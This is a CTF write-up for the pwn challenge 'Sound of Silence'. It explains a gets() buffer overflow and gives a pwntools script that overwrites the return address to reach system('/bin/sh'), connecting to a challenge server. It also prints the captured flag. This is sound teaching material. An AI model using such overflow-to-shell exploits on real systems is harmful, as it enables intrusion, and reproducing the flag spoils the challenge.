# Cyber Apocalypse 2024

## Sound of Silence

> Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!
> 
> Author: w3th4nds
> 
> [`pwn_sound_of_silence.zip`](pwn_sound_of_silence.zip)

Tags: _pwn_

## Solution
For this challenge we get another binary that we decompile with `Ghidra`. The main is extremely short, there is one system call and then the user is promted to input some data. The read is obviously a `buffer overflow`, since no `canary` is in place we can override the `ret` address. But where to jump to?

```c
void main(void)
{
  char local_28 [32];
  
  system("clear && echo -n \'~The Sound of Silence is mesmerising~\n\n>> \'");
  gets(local_28);
  return;
}
```

If we inspect the assembler code we can see that the pointer to the string, which is passed to `system` is in register `RDI`. A bit further down, we can see the same holds true for `gets`, RDI is pointing to our buffer which `gets` writes the user input to. The idea here would be to keep `RDI` pointing to our buffer and returning directly to address `0040116ch` which is the system call. This way `system` would execute whatever we wrote to our buffer before. 

```bash
00401156 f3 0f 1e fa     ENDBR64
0040115a 55              PUSH       RBP
0040115b 48 89 e5        MOV        RBP,RSP
0040115e 48 83 ec 20     SUB        RSP,0x20
00401162 48 8d 05        LEA        RAX,[s_clear_&&_echo_-n_'~The_Sound_of_S_00402   = "clear && echo -n '~The Sound 
            9f 0e 00 00
00401169 48 89 c7        MOV        RDI=>s_clear_&&_echo_-n_'~The_Sound_of_S_00402   = "clear && echo -n '~The Sound 
0040116c e8 df fe        CALL       <EXTERNAL>::system                               int system(char * __command)
            ff ff
00401171 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]
00401175 48 89 c7        MOV        RDI,RAX
00401178 b8 00 00        MOV        EAX,0x0
            00 00
0040117d e8 de fe        CALL       <EXTERNAL>::gets                                 char * gets(char * __s)
            ff ff
00401182 90              NOP
00401183 c9              LEAVE
00401184 c3              RET
```

So we effectively can get shell by entering `/bin/sh` and jumping back to the call to `system`:

```python
from pwn import *

p = remote("94.237.53.53", 38666)
b = ELF("./sound_of_silence")

foo = b"/bin/sh\x00"

payload = b"X" * (0x28-len(foo)) + foo
payload += p64(b.sym.main+19)
p.sendline(payload)
p.interactive()
```

Flag `HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}`